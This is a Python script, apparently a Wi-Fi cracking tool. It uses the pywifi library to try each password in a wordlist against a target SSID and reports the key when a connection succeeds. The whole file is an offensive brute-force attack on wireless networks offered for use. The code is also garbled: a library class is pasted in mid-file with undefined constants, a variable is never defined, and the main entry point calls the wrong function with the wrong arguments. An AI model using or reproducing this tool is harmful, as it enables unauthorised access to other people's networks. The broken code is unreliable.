import os.path
import re
import time
import argparse
import platform

try:
    import pywifi
    from pywifi import const
    from pywifi import Profile
except:
    print("Installing PyWiFi Module")

RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

try:
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    # checking the wifi interfaces (wifi card)
    iface.scan()
    results = iface.scan_results()

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error System")

#!/usr/bin/env python3
# vim: set fileencoding=utf-8

"""Define WiFi Profile."""


class Profile():

    def __init__(self):

        self.id = 0
        self.auth = AUTH_ALG_OPEN
        self.akm = [AKM_TYPE_NONE]
        self.cipher = CIPHER_TYPE_NONE
        self.ssid = None
        self.bssid = None
        self.key = None

    def process_akm(self):

        if len(self.akm) > 1:
            self.akm = self.akm[-1:]

    def __eq__(self, profile):

        if profile.ssid:
            if profile.ssid != self.ssid:
                return False

        if profile.bssid:
            if profile.bssid != self.bssid:
                return False

        if profile.auth:
            if profile.auth!= self.auth:
                return False

        if profile.cipher:
            if profile.cipher != self.cipher:
                return False

        if profile.akm:
            if set(profile.akm).isdisjoint(set(self.akm)):
                return False

        return True


type = False
def main(ssid, password, number):
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)

    # your network speed
    time.sleep(0.1)  # if script not working change time to > 0.1
    iface.connect(tmp_profile)  # trying to Connect
    time.sleep(0.35)  # more if not working

    if iface.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(BOLD, GREEN, '[*] Crack success!', RESET)
        print(BOLD, GREEN, '[*] password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, "[{}] Crack Failed using {}".format(number, password))

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)

def menu():
    parser = argparse.ArgumentParser(description='argparse Ex')

    parser.add_argument('-s', '--ssid', metavar=' ', type=str, help='SSID = WIFI Name')
    parser.add_argument('-w', '--wordlist', metavar=' ', type=str, help='keywords list')

    groupl = parser.add_mutually_exclusive_group()

    groupl.add_argument('-v', '--version', action='store_true', help='version')
    print(" ")

    args = parser.parse_args()

    print(CYAN, "[+] You are using", BOLD, platform.system(), platform.machine(), "...")
    time.sleep(2.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        filel = args.wordlist
    elif args.version:
        print("\n\n", CYAN, "by Wifi cracking With John\n")
        print(GREEN, "Copyright 2024\n\n")
        exit()
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        filel = input("[*] pwds file: ")

    if os.path.exists(filel):
        if platform.system().startswith("Win"):
            os.system("cls")
        else:
            os.system("clear")

        print(GREEN, "[~] Cracking...")
        main(pwd, ssid, filel)
    else:
        print(RED, "[-] NO SUCH FILE.", BLUE)

if __name__ == "__main__":
     menu()
